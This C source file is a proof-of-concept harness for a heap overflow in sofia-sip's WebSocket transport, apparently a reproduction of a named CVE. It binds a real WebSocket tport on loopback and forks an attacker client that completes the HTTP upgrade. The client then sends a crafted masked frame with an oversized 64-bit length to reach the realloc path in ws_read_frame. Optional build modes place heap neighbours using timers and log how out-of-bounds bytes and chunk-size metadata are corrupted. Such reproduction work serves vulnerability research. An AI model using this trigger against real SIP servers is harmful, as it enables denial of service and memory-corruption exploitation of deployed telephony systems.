/*
 * Live SIP-over-WebSocket tport drive for CVE-2026-116791.
 *
 * Binds a real sofia-sip "ws" tport on loopback inside a plant-started
 * process, lets a forked attacker client perform a real HTTP 101 upgrade and
 * send a masked 64-bit-length BINARY frame, and runs the tport's own receive
 * path: tport_recv_stream_ws -> ws_read_frame.  No direct ws_read_frame call.
 *
 *   ./live-ws-tport <port> full   -> 65544-byte frame (realloc path)
 *   ./live-ws-tport <port> short  -> 65520-byte frame (in-bounds control)
 */
#define _GNU_SOURCE
#include <dlfcn.h>
#include <arpa/inet.h>
#include <errno.h>
#include <poll.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>
#include <endian.h>
#include <sofia-sip/su_wait.h>
#include <sofia-sip/tport.h>
#include <sofia-sip/msg.h>
#include <sofia-sip/sip_header.h>
#ifdef LIVE_TIMERS
/* W11 second-order probe.  Neighbour pointer is exported by timer_probe.c. */
extern void *g_ws_neighbor;
extern void *g_ws_realloc_ret;
extern unsigned long long g_ws_next_size_before;
#define NTIMERS 132
#define PREQUEUE 30
su_timer_queue_t *g_queue;
size_t g_capacity;
static su_timer_t *timers[NTIMERS];

static void timer_wakeup(su_root_magic_t *magic, su_timer_t *t,
			 su_timer_arg_t *arg)
{
	(void)magic; (void)t; (void)arg;
}
#endif

#ifndef PIN_LABEL
#define PIN_LABEL "unknown"
#endif

#ifdef LIVE_VICTIM
extern void *g_ws_realloc_ret;
extern void *g_ws_victim;
extern unsigned long long g_next_size_before;
#endif

static const uint8_t mask4[4] = { 0x41, 0x5a, 0x42, 0x43 };

typedef struct live_stack {
	su_root_t *root;
	tport_t *master;
	int received;
	int errors;
} live_stack_t;

static void live_recv(tp_stack_t *stack, tport_t *tp, msg_t *msg,
		      tp_magic_t *magic, su_time_t now)
{
	live_stack_t *ls = (live_stack_t *)stack;
	(void)tp; (void)magic; (void)now;
	ls->received++;
	fprintf(stderr, "TPORT_RECV count=%d\n", ls->received);
#ifdef LIVE_TIMERS
	{
		size_t *w = (g_queue && *g_queue) ? *(size_t **)g_queue : NULL;
		char *neighbor = *(char **)dlsym(RTLD_DEFAULT, "g_ws_neighbor");
		size_t nsize = *(size_t *)dlsym(RTLD_DEFAULT, "g_ws_neighbor_size");
		size_t cap = nsize >= 32 ? nsize / 8 - 3 : g_capacity;
		size_t off = 8 * cap;
		if (w) {
			int k = PREQUEUE, n = 0, rc = 0;
			fprintf(stderr, "TIMER_Q_PTR=%p SHIM_NEIGHBOR=%p DELTA=%td\n",
				(void *)w, neighbor, (char *)w - neighbor);
			fprintf(stderr, "TIMER_Q_BEFORE size=%zu used=%zu boundary_off=%zu\n",
				w[0], w[1], off + 24);
			fprintf(stderr, "TIMER_TAIL_BEFORE last=%016llx oob0=%016llx oob1=%016llx\n",
				*(unsigned long long *)((char *)w + off + 16),
				*(unsigned long long *)((char *)w + off + 24),
				*(unsigned long long *)((char *)w + off + 32));
			while (w[1] < cap + 2 && k < NTIMERS) {
				rc = su_timer_set(timers[k++], timer_wakeup, NULL);
				n++;
				if (rc != 0) break;
			}
			fprintf(stderr, "TIMER_ADDS n=%d last_rc=%d size=%zu used=%zu\n",
				n, rc, w[0], w[1]);
			fprintf(stderr, "TIMER_TAIL_AFTER last=%016llx oob0=%016llx oob1=%016llx\n",
				*(unsigned long long *)((char *)w + off + 16),
				*(unsigned long long *)((char *)w + off + 24),
				*(unsigned long long *)((char *)w + off + 32));
		} else {
			fprintf(stderr, "TIMER_QUEUE_MISSING\n");
		}
	}
#endif
#ifdef LIVE_VICTIM
	if (g_ws_victim && g_ws_realloc_ret) {
		int k;
		fprintf(stderr, "VICTIM_OFF=%td VICTIM_DATA_BEFORE=c3c3c3c3c3c3c3c3 VICTIM_DATA_AFTER=",
			(char *)g_ws_victim - (char *)g_ws_realloc_ret);
		for (k = 0; k < 8; k++)
			fprintf(stderr, "%02x", ((uint8_t *)g_ws_victim)[k]);
		fprintf(stderr, "\n");
	}
	if (g_ws_realloc_ret) {
		uint8_t *sz = (uint8_t *)g_ws_realloc_ret + 65544;
		uint8_t before[8], after[8];
		int k, bad = 0;
		memcpy(before, &g_next_size_before, 8);
		memcpy(after, sz, 8);
		fprintf(stderr, "NEXT_SIZE_BEFORE=");
		for (k = 0; k < 8; k++) fprintf(stderr, "%02x", before[k]);
		fprintf(stderr, " NEXT_SIZE_AFTER=");
		for (k = 0; k < 8; k++) fprintf(stderr, "%02x", after[k]);
		fprintf(stderr, "\n");
		for (k = 1; k <= 5; k++)
			if (after[k] != (uint8_t)(before[k] ^ mask4[k % 4])) bad = 1;
		if (after[0] != 0) bad = 1;
		fprintf(stderr, "LIVE_META_DELTA_BAD=%d\n", bad);
	}
#endif
}

static void live_error(tp_stack_t *stack, tport_t *tp, int errcode,
		       char const *remote)
{
	live_stack_t *ls = (live_stack_t *)stack;
	(void)tp; (void)remote;
	ls->errors++;
	fprintf(stderr, "TPORT_ERROR count=%d err=%d\n", ls->errors, errcode);
}

static msg_t *live_alloc(tp_stack_t *stack, int flags, char const data[],
			 usize_t size, tport_t const *tp, tp_client_t *client)
{
	msg_t *msg;
	(void)stack; (void)data; (void)size; (void)tp; (void)client;
	msg = msg_create(sip_default_mclass(), flags);
	if (msg)
		msg_maxsize(msg, 2 * 1024 * 1024);
	return msg;
}

static tport_stack_class_t const live_class = {
	sizeof(live_class),
	live_recv,
	live_error,
	live_alloc,
	NULL
};

static void write_all(int fd, const uint8_t *buf, size_t len)
{
	size_t off = 0;
	while (off < len) {
		ssize_t w = write(fd, buf + off, len - off);
		if (w < 0) {
			if (errno == EINTR) continue;
			perror("write");
			_exit(3);
		}
		off += (size_t)w;
	}
}

static void build_frame(uint8_t *frame, size_t payload_len)
{
	uint64_t be;
	size_t i;

	frame[0] = 0x82;
	frame[1] = 0xff;
	be = htobe64((uint64_t)payload_len);
	memcpy(frame + 2, &be, 8);
	memcpy(frame + 10, mask4, 4);
	for (i = 0; i < payload_len; i++)
		frame[14 + i] = (uint8_t)(0x11u + (i % 7u));
}

static void attacker_client(int port, size_t payload_len)
{
	char req[512];
	char resp[1024];
	int fd;
	ssize_t n;
	uint8_t *frame;
	int len;

	fd = socket(AF_INET, SOCK_STREAM, 0);
	if (fd < 0) { perror("socket"); _exit(3); }
	{
		struct sockaddr_in sin;
		memset(&sin, 0, sizeof(sin));
		sin.sin_family = AF_INET;
		sin.sin_port = htons((uint16_t)port);
		sin.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
		if (connect(fd, (struct sockaddr *)&sin, sizeof(sin)) < 0) {
			perror("connect"); _exit(3);
		}
	}

	len = snprintf(req, sizeof(req),
		"GET / HTTP/1.1\r\n"
		"Host: 127.0.0.1:%d\r\n"
		"Upgrade: websocket\r\n"
		"Connection: Upgrade\r\n"
		"Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\n"
		"Sec-WebSocket-Version: 13\r\n\r\n", port);
	write_all(fd, (const uint8_t *)req, (size_t)len);

	/* Wait for the real 101 response before sending any frame bytes so the
	 * server's ws_handshake buffer holds only the HTTP request. */
	for (;;) {
		struct pollfd pfd;
		pfd.fd = fd; pfd.events = POLLIN; pfd.revents = 0;
		if (poll(&pfd, 1, 3000) <= 0) {
			fprintf(stderr, "CLIENT_UPGRADE_TIMEOUT\n");
			_exit(3);
		}
		n = read(fd, resp, sizeof(resp) - 1);
		if (n <= 0) { fprintf(stderr, "CLIENT_UPGRADE_EOF\n"); _exit(3); }
		resp[n] = '\0';
		if (strncmp(resp, "HTTP/1.1 101", 12) == 0) break;
	}
	fprintf(stderr, "CLIENT_UPGRADE_101\n");

	frame = (uint8_t *)malloc(14 + payload_len);
	if (!frame) _exit(3);
	build_frame(frame, payload_len);
	write_all(fd, frame, 14 + payload_len);
	fprintf(stderr, "CLIENT_FRAME_SENT payload=%zu\n", payload_len);
	free(frame);
	usleep(400000);
	close(fd);
	_exit(0);
}

int main(int argc, char **argv)
{
	int port = argc > 1 ? atoi(argv[1]) : 18857;
	const char *mode = argc > 2 ? argv[2] : "full";
	size_t payload_len = strcmp(mode, "short") == 0 ? 65520 : 65544;
	live_stack_t stack;
	tp_name_t tpn;
	char const *const ws_transports[] = { "ws", NULL };
	pid_t child;
	int status = 0;
	int i;

	memset(&stack, 0, sizeof(stack));
	su_init();
	stack.root = su_root_create(&stack);
	if (!stack.root) { fprintf(stderr, "ROOT_FAIL\n"); return 2; }
#ifdef LIVE_TIMERS
	{
		int k;
		for (k = 0; k < NTIMERS; k++) {
			timers[k] = su_timer_create(su_root_task(stack.root), 600000);
			if (!timers[k]) {
				fprintf(stderr, "TIMER_CREATE_FAIL k=%d\n", k);
				return 2;
			}
		}
		for (k = 0; k < PREQUEUE; k++) {
			if (su_timer_set(timers[k], timer_wakeup, NULL) != 0) {
				fprintf(stderr, "TIMER_SET_FAIL k=%d\n", k);
				return 2;
			}
		}
		g_queue = su_task_timers(su_root_task(stack.root));
		if (g_queue && *g_queue) {
			size_t *w = *(size_t **)g_queue;
			g_capacity = w[0];
			fprintf(stderr, "TIMER_QUEUE_PTR=%p capacity=%zu used=%zu\n",
				(void *)*g_queue, g_capacity, w[1]);
		}
		fprintf(stderr, "TIMER_SETUP_OK created=%d queued=%d\n",
			NTIMERS, PREQUEUE);
	}
#endif

	memset(&tpn, 0, sizeof(tpn));
	tpn.tpn_proto = "ws";
	tpn.tpn_host = "127.0.0.1";
	tpn.tpn_canon = "127.0.0.1";
	tpn.tpn_port = argv[1] ? argv[1] : "18857";

	stack.master = tport_tcreate((tp_stack_t *)&stack, &live_class, stack.root, TAG_END());
	if (!stack.master) { fprintf(stderr, "TPORT_CREATE_FAIL\n"); return 2; }
	if (tport_tbind(stack.master, &tpn, ws_transports,
			TPTAG_SERVER(1), TAG_END()) < 0) {
		fprintf(stderr, "TPORT_BIND_FAIL\n");
		return 2;
	}
	fprintf(stderr, "SERVER_READY PIN=%s MODE=%s PAYLOAD=%zu PORT=%d\n",
		PIN_LABEL, mode, payload_len, port);

	child = fork();
	if (child < 0) { perror("fork"); return 2; }
	if (child == 0)
		attacker_client(port, payload_len);

	for (i = 0; i < 400; i++) {
		su_root_step(stack.root, 10);
		if (waitpid(child, &status, WNOHANG) == child) {
			/* Let the tport consume the last frame bytes. */
			for (i = 0; i < 20; i++)
				su_root_step(stack.root, 10);
			break;
		}
	}
	if (waitpid(child, &status, WNOHANG) != child) {
		kill(child, SIGKILL);
		waitpid(child, &status, 0);
	}
	fprintf(stderr, "SERVER_DONE PIN=%s MODE=%s RECV=%d ERRORS=%d CHILD_STATUS=%d\n",
		PIN_LABEL, mode, stack.received, stack.errors, status);

	tport_destroy(stack.master);
	su_root_destroy(stack.root);
	su_deinit();
	return 0;
}
